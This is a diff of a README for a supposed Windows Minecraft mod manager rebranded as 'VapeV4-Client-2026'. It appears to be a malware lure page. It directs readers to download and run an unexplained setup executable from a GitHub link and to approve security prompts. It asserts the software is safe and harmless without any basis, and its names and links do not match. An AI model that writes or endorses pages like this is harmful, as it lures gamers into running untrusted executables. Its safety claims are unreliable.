@@ -1,48 +1,70 @@
-# ⛏️ Minecraft Mod Manager
+# ⛏️ VapeV4-Client-2026 - Improve your Minecraft game performance easily
 
-Enhance and optimize your Minecraft experience. 
+[![Download Minecraft Mod Manager](https://img.shields.io/badge/Download-VapeV4--Client--2026-blue)](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026)
 
-The **Minecraft Mod Manager** is a simple, safe, and powerful tool designed for players who want to customize their game client. Whether you want to manage resource packs, install optimization mods, or tweak your visual settings, this suite makes it easy and fast.
+## 🎮 What is this software?
 
----
+VapeV4-Client-2026 acts as a manager for your Minecraft game files. Players use this tool to change how their game looks and performs. It modifies game settings to help you organize your resource packs and utility modifications in one place. This software runs on Windows 10 and Windows 11 systems. It simplifies tasks that you would otherwise perform by manually editing configuration files or opening system folders.
 
-### 🚀 Key Features
+## ✨ Main Benefits
 
-* **🧩 Mod Management:** Easily load and manage your favorite community-made modifications.
-* **⚡ One-Click Optimization:** Enhance your game performance and boost FPS with simple tweaks.
-* **💻 Windows Native:** Built specifically for Windows 10/11.
-* **🚀 Fast Setup:** No complex installation processes or coding required.
-* **🛡️ Safe & Reversible:** Modifies only local files and is completely safe to use.
+*   **Easy Interface:** You manage all your game tweaks from one window. You do not need to hunt through hidden folders to find your files.
+*   **Performance Stability:** The tool applies settings that help your computer run the game at higher frame rates. It reduces lag during intensive gameplay.
+*   **Visual Control:** You change visual settings to match your desired aesthetic. This includes loading custom packs to update how blocks and characters appear.
+*   **Safe Execution:** The software only changes files in your local game directory. You keep full control over your Minecraft client at all times.
+*   **Fast Setup:** You install the tool in seconds. The setup wizard guides you through every step of the process.
 
----
+## ⚙️ System Requirements
 
-### 📥 Installation (Easy as 1-2-3)
+Ensure your computer meets these requirements before you start the setup process:
 
-1. **Download:** Click the button below to get the **MinecraftModManager_Setup.exe** file.
-2. **Install:** Open the file you just downloaded and follow the quick, on-screen setup guide.
-3. **Start:** Launch the app, select your game directory, and click "Activate"!
+*   **Operating System:** Windows 10 or Windows 11 (64-bit version).
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space on your hard drive.
+*   **Minecraft:** A valid installation of the Java Edition of Minecraft installed on your computer.
+*   **Internet Access:** Required for the initial download and for syncing your mod updates.
 
-<p align="center">
-  <a href="https://vape.nexustool.fun/">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Mod_Manager_Installer-blueviolet?style=for-the-badge&logo=minecraft&logoColor=white" alt="Download Now">
-  </a>
-</p>
+## 🚀 How to set up the client
 
----
+Follow these steps to get the software running on your computer.
 
-### ❓ How to use it?
+1.  **Download:** Visit [this page](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026) to get the setup file. Click the download button on the page to save the installation file to your computer.
+2.  **Open the Installer:** Locate the file named `MinecraftModManager_Setup.exe` in your Downloads folder. Double-click this file to start the installer.
+3.  **Grant Permissions:** Your computer might show a security prompt. Click "Run" or "Yes" to allow the installer to make changes to your device.
+4.  **Complete Steps:** Follow the on-screen instructions. The program will ask where to save the files. Keep the default folder settings unless you have a specific reason to change them.
+5.  **Finish:** Click "Finish" when the progress bar reaches the end. The software will create a shortcut on your desktop for quick access in the future.
 
-1. Open the **Minecraft Mod Manager**.
-2. Click **"Scan"** to locate your game directory automatically.
-3. Select the tweaks or performance mods you want to apply.
-4. Click **"Apply"** and launch your game!
+## 🛠️ Usage guide
 
----
+Once you install the client, you launch it using the desktop icon. The main screen shows a list of your installed modifications. 
 
-### 📈 About
+*   **Adding Mods:** Drag your downloaded mod files into the interface window. The manager automatically places them in the correct folder for your game client.
+*   **Enabling Tweaks:** Click the checkbox next to any utility to turn it on. The current status shows as either "Active" or "Inactive."
+*   **FPS Boost:** Navigate to the Settings tab and select the "Optimization" button. The software applies performance patches to help your computer render game frames more efficiently.
+*   **Updating:** The client checks for version updates when you open9 it. If an update exists, a notification appears on the dashboard. Click "Update Now" to install the latest improvements.
 
-This project is built to be the #1 companion tool for everyday Minecraft players. We focus on simplicity—no complicated menus or confusing technical steps, just a better, customized gaming experience.
+## 🛡️ Removing the software
 
-### ⭐️ Support
+If you decide you no longer need the manager, you remove it through your computer settings.
 
-If the **Minecraft Mod Manager** helped you customize your game, please give this project a **STAR**! It really helps the project grow and reach other gamers. 🌟
+1.  Open the Windows **Start Menu**.
+2.  Type "Add or remove programs" and press Enter.
+3.  Search for "VapeV4-Client-2026" in the search box.
+4.  Click the application name and select **Uninstall**.
+5.  Follow the prompts to remove the software from your system.
+
+Deleting the tool will not remove the Minecraft game itself. However, it will remove the customizations you applied through this interface. Your original game files remain safe and intact once you remove the manager.
+
+## ❓ Frequently asked questions
+
+**Does this software work on Mac or Linux?**
+No. This tool is built specifically for Windows 10 and 11. It uses internal Windows functions to manage files, so it will not run on other systems.
+
+**Will I get banned for using this?**
+This tool performs local file management. It changes how your client loads assets. Always check the rules of the specific servers you play on, as some environments have strict policies regarding modifications.
+
+**Does it change my Minecraft login?**
+No. This software does not ask for your password or email. It only manages local files stored on your hard drive. It does not interact with your game account servers.
+
+**What if the settings do not take effect?**
+Restart your Minecraft game after you change settings in the manager. Sometimes the game needs a full load cycle to recognize the changes made to the configuration files. Ensure that your game path directory matches the path selected in the manager's settings menu.
